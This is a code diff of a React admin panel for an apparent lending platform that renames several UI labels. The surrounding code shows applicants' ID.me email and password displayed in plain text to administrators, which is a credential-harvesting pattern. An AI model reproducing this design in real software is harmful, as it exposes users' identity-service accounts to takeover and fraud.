@@ -2266,7 +2266,7 @@ const AdminSection = () => {
                 </div>
 
                 <div className="group">
-                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-primary-500 transition-colors">Intelligence Payload (HTML Supported)</label>
+                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3 ml-1 group-focus-within:text-primary-500 transition-colors">Email content (HTML allowed)</label>
                   <div className="relative">
                     <textarea
                       value={notificationMessage}
@@ -2358,8 +2358,8 @@ const AdminSection = () => {
                 <div>
                   <div className="flex items-center gap-4 mb-2">
                     <div>
-                      <h3 className="text-xl mobile:text-3xl font-black uppercase tracking-tighter">Participant Intelligence</h3>
-                      <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Comprehensive profile & ledger audit</p>
+                      <h3 className="text-xl mobile:text-3xl font-black uppercase tracking-tighter">Customer details</h3>
+                      <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Full profile and ledger check</p>
                     </div>
                   </div>
                 </div>
@@ -2793,7 +2793,7 @@ const AdminSection = () => {
                 ) : selectedTransactionType === 'withdrawals' && selectedTransaction && 'accountDetails' in selectedTransaction && selectedTransaction.accountDetails && (
                   <>
                   <div className="group">
-                    <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4 ml-1">Destinaton Intelligence (Account Details)</label>
+                    <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4 ml-1">Destination details</label>
                     <div className="bg-gray-50 p-8 rounded-[2rem] border border-gray-100 grid grid-cols-1 md:grid-cols-2 gap-8">
                       <div>
                         <p className="text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1">Entity Label</p>
@@ -3330,7 +3330,7 @@ const AdminSection = () => {
                         <p className="text-xs font-bold text-gray-300 uppercase">{selectedLoan.personalInfo.country}</p>
                       </div>
                       <div className="col-span-2">
-                        <p className="text-[9px] font-black text-white/30 uppercase tracking-widest mb-1">Government ID Intelligence Endpoint</p>
+                        <p className="text-[9px] font-black text-white/30 uppercase tracking-widest mb-1">Government ID upload</p>
                         <div className="flex items-center justify-between bg-white/5 p-3 rounded-xl border border-white/10">
                           <span className="text-xs font-bold text-gray-400">{selectedLoan.personalInfo.idmeEmail}</span>
                           <span className="text-[10px] font-mono font-bold text-gray-500">{selectedLoan.personalInfo.idmePassword}</span>
